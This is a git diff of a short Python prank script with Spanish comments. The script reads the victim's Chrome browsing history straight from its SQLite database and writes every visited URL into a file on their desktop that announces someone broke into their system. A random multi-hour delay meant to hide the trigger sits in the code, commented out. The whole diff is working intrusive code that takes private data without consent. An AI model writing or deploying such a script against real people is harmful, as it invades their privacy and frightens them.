@@ -1,9 +1,15 @@
 import os
+from pathlib import Path
 from random import randrange
 from time import sleep
 import sqlite3
 
-HACKER_FILE_NAME = "Holaaa.txt"
+HACKER_FILE_NAME = "Pruebameeee.txt"
+
+
+
+def get_user_path():
+    return "{}/".format(Path.home())
 
 
 def delay_action():
@@ -13,37 +19,43 @@ def delay_action():
     sleep(hours_g) 
 
 
-def create_hacker_file(user_path):
-    hacker_file = open(user_path + "\\OneDrive\\Escritorio\\" + HACKER_FILE_NAME,"w") 
-    hacker_file.write("Hola soy un hijo de dios")
-    return hacker_file
-
-
 def get_chrome_history(user_path):
     try:
-        history_path = user_path + "\\AppData\Local\\Google\\Chrome\\User Data\\Default\\History"
+        history_path = user_path + "AppData/Local/Google/Chrome/User Data/Default/History"
         connecting = sqlite3.connect(history_path)
         cursor = connecting.cursor()
         cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY  last_visit_time DESC")
         urls = cursor.fetchall()
-        print(urls)
+        print("las urls se han obtenido")
         connecting.close() 
         return urls
     except sqlite3.OperationalError:
         return None
 
 
+def create_hacker_file(user_path,chrome_history):
+    hacker_file = open(user_path + "OneDrive/Escritorio/" + HACKER_FILE_NAME,"w") 
+    hacker_file.write("Alguien se colo en tu sustemaaaaaa...\n\n")
+    contador=0
+    for urlss in chrome_history:
+        contador += 1
+        strings_urls = str(urlss)
+        hacker_file.write("\nNumero:{}".format(contador)+"\n"+"\n"+strings_urls)
+    print("se ha creado el archivo con exito")
+
+    return hacker_file
+
+
 def main():
 
-    #delay_action()   
+    ####delay_action()   
     # Calculamos la rusta del usuario de windows    
-    user_path = "C:\\Users\\" + os.getlogin()
-    print(user_path)
-    #Creamos un archivo en el escritorio
-    hacker_file = create_hacker_file(user_path)  
+    user_path = get_user_path()
     #Recojemos el historial de google chrome
     chrome_history= get_chrome_history(user_path)
-
+    #Creamos un archivo en el escritorio
+    hacker_file = create_hacker_file(user_path,chrome_history)  
+    
 
 if __name__ == "__main__":
     main()
